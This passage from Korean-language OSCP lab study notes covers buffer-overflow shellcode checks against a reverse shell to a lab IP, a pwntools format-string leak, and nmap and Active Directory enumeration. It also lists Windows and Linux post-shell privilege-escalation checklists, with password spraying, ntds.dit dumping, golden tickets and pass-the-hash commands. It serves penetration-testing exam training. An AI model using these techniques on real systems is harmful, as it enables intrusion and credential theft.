| ✗ | ✓ | 고정 주소 ROP 체인(릭 불필요) | 중간 |
| ✓ | ✗ | 릭으로 베이스 확보 후 `JMP ESP` 계산. ROP 불필요 | 중간 |
| ✓ | ✓ | 릭 + ROP ← [[Osaka]] | 높음 |

→ **`!mona modules` 로 비-ASLR 모듈이 하나라도 있으면 그 안의 가젯은 주소가 고정이라 릭 자체가 불필요해짐.** 가젯 출처가 이식성을 결정하는 것은 B-94.

#### B-98. 셸코드는 붙이기 전에 눈으로 검증한다 — badchar 통과는 파서 구조의 증거다

**30초면 됨 — 생성된 바이트 안에 LHOST·LPORT·실행 프로그램명이 그대로 보임.**

| 바이트 패턴 | 의미 |
|---|---|
| `\x68\xc0\xa8\x2d\xcf` | `push 0xcf2da8c0` → 리틀엔디언 `c0 a8 2d cf` = **192.168.45.207**(LHOST) |
| `\x68\x02\x00\x01\xbb` | sockaddr push → `0x0002`=AF_INET, `0x01bb`=**443**(LPORT) |
| `\x68\x63\x6d\x64\x00` | `push "cmd\0"` → **순수 cmd 셸**(meterpreter 아님) 확정 |

```bash
msfvenom ... -f raw | xxd | grep -i c0a8
```
오타 하나로 몇 시간이 날아가는 지점이 여기임(B-8-10 · A-31 의 `-o` 덮어쓰기 사고와 같은 계열).

**「배드캐릭터를 확인 안 했다」가 항상 「운이 좋았다」는 아님.** FTP 같은 줄 기반 텍스트 프로토콜이면 `\x00\x0a\x0d` 가 거의 확실히 문제될 것이라는 통념이 있으나, **파서가 문자열 함수(`strcpy` 류)가 아니라 길이 기반(`recv` 가 돌려준 길이만큼 `memcpy`)이면 널도 그대로 통과함.**
→ **널이 잘리지 않고 전달됐다는 관측 자체가 「이 파서는 길이 기반이다」의 증거가 됨.** 반대로 셸코드가 리스너에 붙었다가 즉시 끊기면 **문자열 기반 파서**(중간에서 잘림)를 의심할 것.
→ ⚠️ **그래도 `-b '\x00\x0a\x0d'` 는 습관으로 넣을 것** — 파서 종류는 덤프를 보기 전에는 알 수 없고 넣어서 손해가 없음. 금지 바이트를 «모를» 때의 절차는 `"\x01\x02…\xff"` 전체를 보내고 디버거 메모리에서 끊기거나 변형된 바이트를 찾아 제거 목록을 만든 뒤 `msfvenom … -b '<목록>' -f py -v sc` 임. 헤더 위치별 금지 바이트 표는 B-93.

#### B-99. 셸코드 아키텍처를 확정하지 않고 만들면 즉사한다

**증상이 지독함 — 오프셋도 맞고 EIP 도 잡히는데 셸코드 진입 즉시 액세스 위반.** 「배드캐릭터인가」 「DEP 인가」를 의심하며 한참 팜.

| 확인 방법 | 32비트 신호 | 64비트 신호 |
|---|---|---|
| 릭 값 자릿수 | 최대 8자리 (`0x012d10f0`) | 12자리 이상 (`0x7ff6a1b20000`) |
| 크래시 시 레지스터 | `EIP`/`ESP` | `RIP`/`RSP` |
| 타겟 파일 경로 | `C:\Program Files (x86)\` | `C:\Program Files\` |
| `tasklist`(셸 확보 후) | 32비트 프로세스는 `*32` 표기 | 표기 없음 |

⛔ **64비트 Windows 에서도 서비스는 32비트로 도는 경우가 많음. 판정 기준은 OS 가 아니라 «그 프로세스»임.**
[[Osaka]] 가 정확히 그 경우임 — OS 는 `10.0.17763` x64 인데 취약 서비스는 x86 이라 `msfvenom -a x86`, ROP 가젯은 `p32()` 로 팩. 회수된 바이너리의 PE 헤더도 machine `0x014c`(IMAGE_FILE_MACHINE_I386)로 확인됨(2026-08-26 재확인).

#### B-9-10. 원샷 익스플로잇 — 던지기 직전 5항목

**스택을 파괴하는 익스플로잇은 실패하면 프로세스를 크래시시킴.** 서비스가 자동 재시작되지 않으면 그 포트가 사라지고 그때부터는 리버트 말고 방법이 없음(A-32). 스크립트에 일시정지를 넣는 것이 실질적 방어임:
```python
print("Press any key to send")
input()          # ← 이 사이에 리스너를 확인한다
```

**한 번 죽으면 되돌릴 수 없으므로 다섯 개를 눈으로 확인할 것:**
1. **리스너가 실제로 떠 있는가** — `ss -tlnp | grep 443`. 마음속으로 「띄웠지」는 안 됨(A-31 의 tmux 세션 뒤바뀜 사고)
2. **셸코드의 LHOST 가 «지금» VPN IP 와 같은가** — `ip a show tun0`. VPN 재접속으로 IP 가 바뀌는 것이 가장 흔한 사고(A-65)
3. **포트가 리스너와 셸코드에서 일치하는가** — 셸코드는 443, 리스너는 4444 로 띄우는 실수
4. **`assert` 로 페이로드 총 길이를 검증했는가**
5. **릭 베이스가 `0x____0000` 인가**(B-96)

**셸이 붙은 «직후» 칠 명령**(리눅스의 `id; sudo -l` 에 해당, C-2):
```text
whoami
whoami /priv                    :: ★ 여기서 끝나는 박스가 놀랄 만큼 많다 (B-48)
whoami /groups
hostname & ipconfig /all
net user & net localgroup administrators
systeminfo                      :: OS 빌드 + 핫픽스 → 커널 익스플로잇 판단
```

#### B-9-11. pwntools `recvuntil` 뒤 잔여 개행 — 인덱스가 하나씩 밀린다

**증상** — `recvuntil(b"230 Login successful")` 다음 `recvlines()` 로 파싱하는데 값이 하나씩 밀려 있거나 `ValueError`·빈 값이 남. `recvuntil` 은 **지정한 바이트열까지만 소비하고 뒤따르는 개행은 버퍼에 남김** — 다음 `recvlines(numlines=N)` 의 첫 줄이 그 잔여 개행이고 진짜 응답은 그 다음 줄부터임.

[[Osaka]] 는 `p.recvlines(numlines=2)[-1][6:]` 로 우회했음(2줄 받아 마지막 것만 사용). **더 근본적인 해법은 종결자까지 인자에 포함시키는 것:**
```python
p.recvuntil(b"230 Login successful\r\n")   # 종결자까지 명시적으로 소비
p.sendline(b"DEBUG " + b"%x|" * 100)
leak = p.recvline().strip()[6:]            # recvline() 한 번이면 충분해짐
```
→ `numlines=1` 로 짰다면 `leak` 가 빈 바이트열이 되고 `int(b'', 16)` 에서 `ValueError` 로 죽음 — **크래시 지점이 파싱 코드라 「익스플로잇이 안 통한다」로 오독하기 쉬움**(A-14 의 「로컬 트레이스백이면 타겟은 무죄」).
→ 파싱이 이상하면 먼저 `remote(..., level='debug')` 로 **송수신 전량을 로그로 찍어 실제 바이트를 볼 것.**

## C. 반사 체크리스트

### C-1. 정찰 직후

**정찰은 `~/PG/_lib/recon.sh` 한 번** — nmap·gobuster·응답 본문을 한 번에 파일로. UDP 상위 포트도 훑을 것(Fundamental 에서 UDP 가 답인 경우 있음).

⚠️ `nnmap` 별칭에 `-oN nmap.log` 가 박혀 있어 **작업 디렉터리를 안 바꾸면 이전 박스 로그를 덮어씀.** `cd ~/PG/<박스>` 를 먼저 할 것.

**`filtered` 포트를 표로 적어 둘 것.** 침투 후 `ss -lntp` 와 대조할 목록이 됨. [[Outdated]] 는 `10000/tcp filtered` 하나가 권한상승 경로 전체였음(A-1-17 · B-71).

**25/tcp 에 MTA 가 있으면 배너로 끝내지 말 것.** `EHLO` 응답과 **EICAR 한 줄**이면 뒤에 AV 필터(milter)가 붙었는지 알 수 있고, 붙어 있으면 공격면이 통째로 바뀜([[ClamAV]] — B-2-11).

**`-p-` 는 항상.** [[ClamAV]] 에서 top-200(`quick.log`, 1.03초)과 전 포트(`nmap.log`, 74.5초)의 차이가 **60000/tcp 한 줄**이었음. ⚠️ 다만 그 60000 은 22/tcp 와 **ssh-hostkey 지문이 동일**해 같은 sshd 가 두 포트에 물린 것이었고 **경로와는 무관**했음. **호스트키 지문 대조가 「포트가 여럿인데 같은 데몬인가」를 판정하는 가장 싼 방법**임.

**`-p-` 목록에서 「nmap 이 제품명을 붙여준 포트」부터 손으로 열 것.** 실측([[Jacko]]): 80 은 20분짜리 열거를 먹고 정보 0(A-16), 8082 는 열자마자 정확한 버전(`H2 1.4.199`)을 줬고 그 버전이 곧장 익스플로잇으로 이어졌음.
**관리 콘솔의 로그인 폼을 만나면 익스플로잇을 찾기 전에 5초를 기본값에 쓸 것** — [[Jacko]] `sa`/빈 비밀번호 · Walla `admin:secret` · Extplorer `admin:admin`(제품별 표는 B-1-37).

**무명 CMS 를 만나면 순서가 정해져 있음:**
1. `generator` 메타·푸터로 **버전 확정**(독립 근거 2개, A-11 · B-1-29)
2. `searchsploit`(A-1-11 — 0건도 히트도 근거가 아님)
3. **결과가 「인증 필요」인지 확인**
4. 붙었으면 문제는 익스플로잇이 아니라 **크리덴셜**임

[[Monster]] 는 정확히 ③에서 방향이 갈렸음 — EDB-48479·49949·52038 이 **전부 admin/editor 세션 전제**였음. 사용자명 무료 열거는 B-1-32, 사전 만들기는 B-6-10.

**`clock-skew` 를 읽을 것.** [[ClamAV]] nmap 이 `median: 3h59m59s` 를 냈고, 실제로 셸의 `date` 가 Kali 와 4시간 어긋났음(타겟 `Thu Aug 20 05:35:45 EDT` ↔ Kali 14:35 KST). **증거 스크린샷의 시각이 이상해 보이면 이것부터 의심할 것** — 타겟 시계가 틀린 것이지 내 기록이 틀린 것이 아님.

**`nnmap` 별칭의 플래그가 각각 왜 붙어 있는가 — 빼면 무엇을 잃는가:**

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-p-` | 1~65535 전수 | 기본은 상위 1000. **웹이 450·17445·43500·50080 에 있으면 박스를 통째로 놓침**(A-1-15) |
| `-sCV` | 기본 NSE + 버전 탐지 | `http-title`·`http-server-header`·`http-robots.txt` 가 안 나옴 — **개발 서버 판정의 유일한 단서가 사라짐**(B-1-41) |
| `-Pn` | 핑 생략 | ICMP 를 막은 타겟을 「다운」으로 오판해 스캔이 시작조차 안 됨 |
| `-A` | OS·traceroute | `OS details` 가 안 나옴(⚠️ 그 값의 신뢰도는 A-11) |
| `--min-rate 5000` | 초당 최소 패킷 | `-p-` 가 수십 분으로 늘어남 — 24시간 시험에서 감당 불가 |
| `-oN <파일>` | 노멀 포맷 저장 | 보고서 원문 근거가 없음. **시험은 증거가 곧 점수임.** 스크롤백은 사라짐 |

⚠️ **NSE 없는 스캔과 있는 스캔이 «같은 포트에 다른 서비스»를 낼 수 있음.** [[Crane]] 은 `-sCV -A` 쪽이 `Apache httpd 2.4.38`, `-sS -sV` 쪽이 `tcpwrapped` 였음. **`tcpwrapped` = 핸드셰이크는 성립했으나 버전 프로브 중 연결이 끊긴 것**이지 「서비스 없음」이 아님. **NSE 가 붙은 쪽 판정을 따를 것**(A-11 의 「배너를 받은 쪽이 이김」과 같은 선).

**`서비스이름?` 형태의 nmap 출력을 버리지 말 것.** 물음표는 「이 포트 번호에 등록된 이름은 이거지만 배너로 확인은 못 했다」는 뜻임.
1. 그 이름을 **다른 포트에서 얻은 정보와 대조**함
2. 맞으면 **버전 판정의 두 번째 근거**가 됨
3. 안 맞으면 `nc -nv <ip> <port>` 로 배너를 직접 받아 볼 것

[[Kevin]] — `3573/tcp open tag-ups-1?` 의 `ups` 가 무정전 전원장치이고 80번의 `http-title: HP Power Manager` 와 일치했음. ⚠️ 다만 `tag-ups-1` 은 `/usr/share/nmap/nmap-services` 의 등록 라벨(`# Advantage Group UPS Suite`, 빈도 `0.000000`)이라 **HP 제품명이 아님** — 교차 근거로 쓰되 **제품 확정에 쓰지 말 것**(A-11).
반대로 [[Osaka]] 에서는 `fingerprint-strings` 가 통째로 뜨는 미확인 서비스가 **커스텀 바이너리 = 메모리 손상 후보** 신호였음(B-9). **미확인 포트는 정보가 없는 게 아니라 다른 종류의 정보임.**

**`dirb`·`ffuf` 를 돌리기 «전에» 루트를 눈으로 볼 것.** Apache autoindex 가 켜져 있으면 워드리스트로 맞출 필요가 없고, 게다가 **파일 타임스탬프**까지 딸려 나와 그것이 버전 판정 근거가 됨(A-13). [[Astronaut]] — nmap `http-ls` 가 `grav-admin/ 2021-03-17 17:46` 을 그대로 뱉었고 그 값이 Grav 1.7.8 태그 커밋(`2021-03-17T17:44:48Z`)과 1분 차이라 **설치 시점 = 릴리스 직후**가 확정됐음.
**「`-p-` 가 결과를 바꾸지 않았다」도 스캔을 돌려야 알 수 있는 사실임.** 포트가 22·80 뿐이라는 것을 확인해야 「공격면은 80 하나」라는 판단이 서고, 그래야 열거에 시간을 배분할 근거가 생김.
**flat-file CMS 는 계정도 파일임** — 읽기가 되면 `user/accounts/*.yaml` 에서 해시가 나옴(B-1-27 · B-1-48).

**웹이 없는 Windows·AD 박스를 만나면 공격면은 셋뿐임** — SMB(445) · LDAP(389) · Kerberos(88).
```bash
smbclient -L //IP -N ; smbmap -H IP -u ''            # ① 익명 공유 — WRITE 가 보이면 즉시 강제 인증
nxc smb IP -u '' -p '' --users --rid-brute           # ② 사용자 열거
nxc smb IP -u guest -p '' --shares                   # ③ 게스트
ldapsearch -x -H ldap://IP -b <baseDN>               # ④ 익명 LDAP (description 필드)
impacket-GetNPUsers <dom>/ -usersfile u.txt -no-pass # ⑤ AS-REP (사용자 확보 후)
enum4linux-ng -A IP                                  # ⑥ 위를 묶어 자동화 — 던져놓되 기다리지 말 것
```
**우선순위는 비용 오름차순임** — (0) 익명 SMB·LDAP → (1) 사용자 목록 → (2) AS-REP(비번 불요) → (3) 스프레이 → (4) 크랙. **앞 단계에서 자격증명이 하나 나오면 뒷 단계를 건너뜀.** [[Vault]] 는 (0)에서 쓰기 공유를 찾아 강제 인증으로 바로 자격증명을 얻어 (1)~(4)가 통째로 불필요했음(B-57 · 익명 표기는 A-1-30).

**진입점이 안 나오면 다음 후보 다섯:**
1. **비밀번호 스프레이** — `nxc smb IP -u users.txt -p 'Welcome1' --continue-on-success`. **`--continue-on-success` 가 없으면 첫 성공에서 멈춤.** 계정 잠금 정책을 먼저 보고 계정당 1~2회로 제한(A-2-12)
2. **AS-REP 로스팅** — 사전인증 비활성 계정이 있으면 비번 없이 해시(B-55 ⑸)
3. **`description` 필드 비밀번호** — `nxc ldap IP -u U -p P -M get-desc-users`(B-51)
4. **SYSVOL GPP `cpassword`** — `Groups.xml` 의 AES 키가 공개된 암호 → `gpp-decrypt`
5. **자격증명 재사용** — 단 **같은 도메인·같은 타겟인지 확인**(A-65 의 IP 잔류 사고와 같은 뿌리)

**자격증명을 하나 얻으면 그다음 순서:**
1. `nxc smb <대역> -u U -p P --shares` — 쓰기 공유 재확인. 다른 호스트에도 미끼
2. `bloodhound-python -u U -p P -d <FQDN> -ns <DC-IP> -c All` — GPO·ACL 아웃바운드 엣지(B-53)
3. WinRM·RDP 셸 → `whoami /priv` → **`SeBackup` 이 보이면 최우선으로 `ntds.dit` 덤프**
4. `ntds.dit` 의 `krbtgt` 해시로 골든 티켓 → 도메인 영구 장악, 크로스호스트 피벗
5. Administrator NT 해시로 다른 호스트에 PtH(`impacket-psexec -hashes :<NT>`)
6. SYSVOL 훑기 — GPP `cpassword`·로그온 스크립트 평문

**시간 배분** — 웹 없는 AD 는 **SMB·LDAP 열거 15분**에 승부가 갈림. 특권 확인은 셸을 잡은 **첫 30초**(`whoami /priv` 한 줄)에 끝남.
⚠️ **AD 박스에서는 `/etc/hosts` 등록을 반사적으로 할 것**(A-51) — `bloodhound-python` 의 `-ns` 는 LDAP 리졸버만 바꾸고 Kerberos 단계는 시스템 리졸버를 씀.

### C-2. 셸 직후

**셸을 잡자마자** — 하나씩 치지 말고 `~/PG/_lib/harvest.sh` 한 번(A-41). 최소 7개는:
`id` · `sudo -l` · `find / -perm -4000 -type f 2>/dev/null` · `getcap -r / 2>/dev/null` · `crontab -l; cat /etc/crontab` · **`ps auxf`(누가 root 로 도는가)** · **`ss -lntp`(내부 리슨 서비스)**
⚠️ 마지막 둘을 빼지 말 것 — [[GLPI]] 는 `ps`(Jetty=root) ∩ `find / -writable -type d`(webapps 쓰기 가능)의 **교집합**이 답이었음(B-34).
⚠️ **root 셸이면 열거 전에 `id` 로 `euid=0` 을 확인할 것**(B-33). SUID 셸에서 `sh script.sh` 로 넘기면 권한이 조용히 빠짐.
**권한상승이 필요 없는 박스라도 습관으로 칠 것** — [[Wombo]] 는 첫 명령 `id` 에서 이미 `uid=0` 이 떠 나머지가 불필요했으나, 저권한으로 떨어지는 변형에서는 이 반사가 시간을 아낌.
⚠️ **권한을 올렸으면 같은 열거를 그 권한으로 다시 돌릴 것** — [[Mice]] 에서 같은 스크립트가 6,692행 → 9,282행이 됐음(A-41). 저권한 결과의 빈칸은 「없음」이 아니라 「안 보임」임.

⚠️ **「셸 잡은 직후」의 실제 의미는 «30초 안»임.** [[Cockpit]] 은 `local.txt` 획득 **11:13** 부터 `sudo -l` 을 찍은 **13:01** 까지 **108분** 동안 어떤 산출물도 스크린샷도 없음(자리 비움으로 보이고 기술적 시행착오였다는 근거는 없음, A-64). 그런데 **그 박스는 `sudo -l` 한 줄로 권한상승이 끝나는 박스**였음. 뜸을 들이는 것 자체가 이 반사를 무력화함.

⚠️ **더 극단적인 사례 — [[Clue]] 는 `sudo -l` 에 `NOPASSWD: cassandra-web` 이 «즉시 보이는» 박스였는데 실제 root 획득은 6일 뒤였음**(다회 세션·박스 리버트 간격 포함이라 순수 방치는 아님). 그래도 **「셸 잡자마자 `sudo -l`」 반사가 있었다면 발상까지 몇 분이면 닿았을 경로**임(A-4-18). 위 [[Cockpit]] 108분과 같은 실패이고 규모만 다름.

⚠️ **비밀값을 환경변수로 넘겨 열거 스크립트를 돌리면 그 값이 수집 로그에 평문으로 남음.** `harvest.sh` 의 `ENV` 섹션이 `env` 를 그대로 실행하기 때문 — [[LazySysAdmin]] 에서 `harvest_togie.txt` 921행에 `HARVEST_PW=12345` 가 그대로 찍혔음(값만 가리고 행은 남김). 스크립트는 `env 2>/dev/null | grep -v '^HARVEST_PW='` 로 수정됨(백업 `~/PG/_lib/harvest.sh.bak-envleak`, 재실행 검증 산출물 `harvest_envleak_verify.txt` — `grep -c '12345'` = 0, ENV/PATH·SUDO 섹션 정상). **자격증명 자체는 침투 경로라 노트에 정당하게 실림 — 가린 것은 「환경변수 유출」이라는 위생 문제임.**

**⛔ SUID 바이너리를 만나면 `strings <바이너리>` 가 3초짜리 반사임.** 상대경로 명령(`cat`·`ls`)이 보이면 **PATH 하이재킹**(B-3-12), 포맷·커맨드 인젝션 흔적(`system`·`asprintf`·`popen`)이 보이면 **문자열 삽입**(B-32), 둘 다 아니면 `ltrace`/`strace`. Go 정적 바이너리는 `strings` 대신 `nm` 심볼(B-3-13).
[[PwnLab]] 은 `msgmike`·`msg2root` 둘 다 이 반사 하나로 갈렸음(각각 B-3-12 · B-32).

**Windows 셸이면** — `whoami /all`(권한·IL) · `net user`/`net localgroup administrators` · `systeminfo`(hotfix) · **Sticky Notes/브라우저 저장 비밀번호/`cmdkey /list`/Winlogon AutoLogon 자격증명 스윕**(B-43).
⚠️ 서비스 계정에서 나온 셸이면 **`whoami /priv` 의 `SeImpersonatePrivilege` 한 줄**이 권한상승 경로 전체를 결정함(B-46).

**리눅스 5줄 반사 — 각 줄이 «무엇을 묻는가»까지 외울 것:**
```bash
id                                       # ① 내가 누구이고 어떤 그룹인가 (docker·lxd·disk 면 그 자체가 root 경로, B-3-10)
sudo -l                                  # ② NOPASSWD 항목이 있는가 (있으면 GTFOBins 직행)
find / -perm -4000 -type f 2>/dev/null   # ③ SUID 바이너리
getcap -r / 2>/dev/null                  # ④ 파일 capability (cap_setuid=ep 면 즉시 root)
cat /etc/crontab; ls -la /etc/cron.*     # ⑤ 크론 — 쓰기 가능한 스크립트를 root가 주기 실행하는가
```
**애플리케이션 설정 디렉터리를 여섯 번째로 둘 것 — 대개 자격증명 저장소임**(B-62 · A-41 의 스택별 표). [[pyLoader]] 라면 `/root/.pyload/settings/pyload.cfg` 와 `files.db`(다운로드 사이트 계정), [[plum]] 은 메일함, [[Codo]] 는 설정 파일이 같은 역할이었음.

**Windows 판 — 웹셸을 잡으면 첫 명령은 `whoami`, 두 번째는 `whoami /priv`.**

| `whoami` 결과 | 다음 수순 |
|---|---|
| `nt authority\system` | **최고 권한.** 남은 것은 «대화형» 셸 확보뿐(A-3-13 · E 절) |
| `iis apppool\<앱풀명>` · `nt authority\network service` | `SeImpersonatePrivilege` 확인 → PrintSpoofer·GodPotato·SigmaPotato(B-46) |
| 일반 계정 | winPEAS·서비스 권한·언쿼티드 경로 등 정식 열거(B-44) |
| `net user /add` 가 그냥 됨 | 앱풀이 **특권 신원**임([[Butch]]) |

**Windows 셸 잡자마자 칠 열거 5개**(리눅스의 `id`·`sudo -l`·`find -perm` 대응):
```text
whoami /all
net user & net localgroup administrators
systeminfo                                  ← 패치 수준
wmic service get name,pathname,startmode    ← 언쿼티드 경로
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
⚠️ 서비스 목록은 `StartName`(실행 계정)까지 함께 찍을 것(B-44). 관리자 그룹에 넣었는데 특권이 안 붙으면 A-4-15.

**`nt authority\system` 이면 열거를 통째로 건너뜀.** [[Kevin]] 은 익스플로잇이 SYSTEM 컨텍스트(`DevManBE.exe` 가 SYSTEM 서비스)로 실행돼 첫 `whoami` 에서 이미 끝났음 — winPEAS·서비스 권한·AlwaysInstallElevated 를 돌릴 이유가 없음. [[Squid]] 는 정반대로 `LOCAL SERVICE` 로 떨어져 FullPowers → PrintSpoofer 두 단계가 필요했음. **`whoami` 한 줄이 그 갈림길을 결정함.**
⚠️ **Metasploit 모듈의 `'Privileged' => false` 를 오독하지 말 것** — 「익스플로잇 실행에 특권이 필요 없다」는 뜻이지 **결과 권한이 낮다는 뜻이 아님.**

**리눅스 판 실측** — [[Astronaut]] 은 **세 번째 줄(`find / -perm -4000`)에서 끝났고** 순서를 지키면 30초임. 그리고 크론 확인 습관이 여기서 **이중으로** 값을 함 — 셸을 얻은 경로 자체가 크론이라 `crontab -l` 에 `bin/grav scheduler` 줄이 나오고 **왜 60초가 걸렸는지가 사후에 확인됨**(B-31).


**5줄 반사를 «한 줄로 묶어» 칠 것 — 왕복이 병목임.**
[[Flu]] 2차 세션은 권한상승이 **약 5분**에 끝났고, 이유는 운이 아니라 순서였음. 반사 명령을 `;` 로 이어 한 번에 치고, 전부 빈손인 것을 확인한 즉시 `find / -writable` 로 넘어갔음. **도구를 하나도 올리지 않았음.**
```text
id; echo ===; uname -a; cat /etc/os-release | head -3; echo ===; sudo -n -l 2>&1; echo ===; ls -la /home /root 2>&1; echo ===; getcap -r / 2>/dev/null; echo ===CRON; cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.hourly/ 2>&1; crontab -l 2>&1; echo ===DONE
```
— 출처: `~/PG/Flu/privesc_session.log`
- `echo ===` 구분자를 끼우는 것이 요점 — 출력이 한 덩어리로 오므로 **경계가 없으면 어느 명령의 결과인지 못 가림**
- `uname -a` + `/etc/os-release` 를 함께 넣을 것. 추정을 실측으로 교체하는 데 1초임(A-11)
- **`sudo -n -l` 의 `-n` 을 붙일 것** — 없으면 비밀번호 프롬프트에서 멈추고 TTY 없는 리버스셸이 그대로 먹통이 됨. `-n` 이면 `sudo: a password is required` 한 줄을 뱉고 즉시 돌아오며 판정 정보는 동일함
  ⚠️ 단 이 절과 A-41 의 「`sudo -S -l` 로 다시 칠 것」 규율은 그대로 유효함 — Flu 는 재사용 가능한 비밀번호가 없어 해당되지 않았음


**첫 명령은 언제나 `whoami` — 그 한 줄로 권한상승 장이 통째로 사라질 수 있음.** [[Algernon]] 은 리버스셸이 붙자마자 친 `whoami` 가 `nt authority\system` 이었고 그 시점에서 남은 일이 플래그 읽기뿐이었음. **그런데도 열거를 먼저 시작해 30분을 태우는 일이 흔함.**
서비스 익스플로잇으로 잡은 셸이면 다섯 개를 이 순서로:
```powershell
whoami                                       # ① 나는 누구인가 ← SYSTEM 이면 여기서 끝
whoami /priv                                 # ② SeImpersonate / SeBackup / SeDebug 가 있는가
whoami /groups                               # ③ Administrators 멤버인가
systeminfo                                   # ④ OS 빌드·핫픽스 (커널 익스플로잇 판단)
Get-CimInstance Win32_Service | Select Name,StartName,State,PathName   # ⑤ 서비스 계정과 경로
```
리눅스의 `id`·`sudo -l`·`find / -perm -4000`·`getcap -r /`·`crontab -l` 에 대응하는 세트임 — **리눅스 반사는 여기서 전부 무용지물.**


**Windows/AD 셸을 잡으면 치는 첫 5개** — 리눅스 반사신경은 여기서 전부 무용지물이다.
```powershell
whoami /all                       # 사용자 SID + 그룹 + 특권 한 번에
whoami /priv                      # ★ 특권 이름 하나가 곧 경로다
net user <나> /domain             # 내 그룹 멤버십
net localgroup administrators     # 로컬 관리자 명단
systeminfo                        # 빌드·패치·도메인 가입 여부
```
여기에 `Get-ChildItem C:\Users`(다른 계정 존재)와 `C:\`·`C:\Program Files` 훑기를 더한다.
→ [[Heist]] 는 `C:\Users` 에서 `svc_apache$` 를 봤고(**끝의 `$` = 컴퓨터 계정 아니면 (g)MSA**, 프로필이 있으니 로그온한 적이 있는 서비스 계정), `whoami /priv` 에서 `SeRestorePrivilege` 를 봤다. **권한상승 경로 전체가 이 두 명령에서 나왔다.**

### C-3. 플래그·증거

**플래그 증거는 «한 화면»으로** — 값 33바이트만 저장하면 「대화형 셸에서 얻었다」를 증명할 수 없음(실수 3연속: Mice·Wheels·Cobbles).
```bash
whoami; id; hostname; hostname -I; date; cat <플래그경로>
```
를 **한 명령으로 묶어** 실행하고 출력 전체를 `proof_user.txt` / `proof_root.txt` 로 저장.
셸이 불안정하면 특히 중요 — Internal 처럼 셸이 수 초만 사는 경우 플래그를 **제일 먼저** 이 형식으로.
cmd 에서는 `;` 대신 `&`:
```powershell
whoami & hostname & ipconfig | findstr IPv4 & date /t & time /t & type C:\Users\Administrator\Desktop\proof.txt
```

**⚠️ 증거 «회수» 채널과 «조작» 채널이 다르면 증거가 화면에 갇힘.** 상위 권한을 GUI(RDP/VNC)에서 잡았는데 파일을 빼낼 채널(SSH·HTTP·SMB)이 이미 죽어 있으면 출력을 파일로 못 가져옴.
[[Mice]] 실측 — GUI 아이콘을 되살리려 `logoff`·재부팅을 쓰면서 **nc 리버스셸이 같이 죽었고**(`shell443.log` 마지막 기록 23:27:14), 재부팅 뒤 스테이저 재주입 2회도 콜백 없음(`rce_retry.log` 23:39 · `shell443b.log` 23:43 은 `listening on ...` 한 줄뿐). SYSTEM 획득(00:05) 이후 작업이 전부 RDP GUI 안에서만 이뤄졌고 타겟→Kali 파일 채널이 없었음. 빼내려는 시도도 실패 — GUI 로 타이핑한 `ReadAllBytes(...)` 원라이너가 이스케이프가 깨져(`\x27`) 파서 에러로 죽음(`~/PG/Mice/rdp44.png`). **`harvest_admin.txt` 가 0바이트인 것이 그 흔적** — 빈 파일이 아니라 「빈 응답을 받았다」는 기록.
⚠️ **Kali 접속이 끊긴 것이 아님** — `rdp41~44.png` 가 00:05:12~00:11:20 에, `harvest_admin.txt` 가 00:10:35 에 Kali 에 기록됐고 `http.log` 에도 `[21/Aug/2026 00:08:08] "GET /harvest.ps1"` 이 남음. 끊긴 것은 **타겟에서 Kali 로 파일을 밀어 올릴 채널**임.
→ **회수 채널이 죽었는지를 «권한을 올리기 전에» 확인할 것.** 그리고 **상위 권한을 잡자마자 가장 먼저 할 일이 증거 한 화면 찍기**임 — [[Mice]] 는 그것만 제때 해둔 덕에 플래그가 인정됐음.

**⚠️ 「목표가 파일 하나면 셸을 만들지 마라」는 «정보 획득» 기준의 조언임 — 시험 점수 기준으로는 틀림.**

[[Pebbles]] 실측 — `proof.txt` 를 blind SQLi `LOAD_FILE()` 로 읽어 값을 확보했고(`~/PG/Pebbles/proof.out`), 그래서 UDF 로 셸을 잡는 표준 경로를 아예 시작하지 않았음. 판단 자체는 합리적이었음(UDF 는 `.so` 아키텍처 정합·`plugin_dir` 위치·`INTO DUMPFILE` 권한 등 실패 지점이 많음). **그러나 OSCP 규정은 값이 아니라 「대화형 셸에서 원위치 `cat` 한 한 화면」을 요구함** — *"this includes any type of web-based shell"*. 웹/DB 채널로 읽은 플래그는 **0점**임(E 절).

→ **「점수용 셸」과 「정보 획득」을 갈라서 계획할 것.** 파일 하나가 목표면 `LOAD_FILE` 이 최단이지만, 그것으로 끝내면 시험에서는 아무것도 얻지 못함. **값을 먼저 뽑아 안전판을 만들고, 그 다음에 셸을 마저 잡는 것**이 순서임.

**`local.txt` 가 홈에 없으면 «계정 목록»부터 볼 것.**
```bash
find / \( -name 'local.txt' -o -name 'proof.txt' -o -name 'user.txt' \) 2>/dev/null
```
후보 위치 순서 — `/home/<user>/` → `/var/www/` → `/srv/` → `/opt/` → `/root/`.
**어디를 뒤질지는 계정 목록이 먼저 알려줌** — `getent passwd | grep -v nologin` 으로 로그인 가능한 계정을 봄. **계정이 root 뿐이면 사람 홈이 아니라 «서비스 계정 홈»(`/var/www` 등)을 볼 것.** ([[Muddy]] · [[Crane]] 동일 패턴)

**⚠️ `/root` 에 flag 로 보이는 파일이 둘이면 둘 다 읽을 것.** [[Fowsniff]] 의 `/root/flag.txt` 는 **미끼**였음 — 내용이 `Your flag is in another file...`. 원본 VulnHub 판의 잔재이고 PG 가 채점하는 것은 `proof.txt` 임.

**부수 증상 — 셸을 안 잡으면 뒤늦게 잡기가 더 어려움.** [[Pebbles]] 는 플래그 확보(10:25) 뒤 32분이 지나서야 SSH 키쌍을 만들었고(`peb_key`·`peb_key.pub` 10:57), 다시 12분 뒤 작성한 재침투 스크립트(`pebbles_pwn.sh` 11:09)의 첫 줄이 `# One-shot re-exploit for Pebbles once the box is back up.` 임 — **그 시점에 박스가 이미 정지돼 있었음.** 셸은 끝내 못 잡았음. 「일단 값은 얻었으니」로 미루면 슬롯이 먼저 닫힘.

**⛔ 제출 증거로는 «프롬프트만»으로 부족함.** `root@box:~#` 이 보여도 위조가 쉬워 시험 심사에서 인정되지 않음 — 반드시 `whoami`·`hostname`·`ip a` 와 **한 화면**에 담을 것.
⚠️ **이것은 「노트에서 타겟 pty 프롬프트를 지우라」는 뜻이 «아님»** — 그쪽은 「플래그를 대화형 셸에서 읽었는가」의 판정 근거라 반드시 남길 것(E 절). **제출 증거의 요건**과 **기록의 증거력**은 다른 이야기임.

**규정 필수와 관행 권장을 구분해 적을 것:**

| 등급 | 항목 |
|---|---|
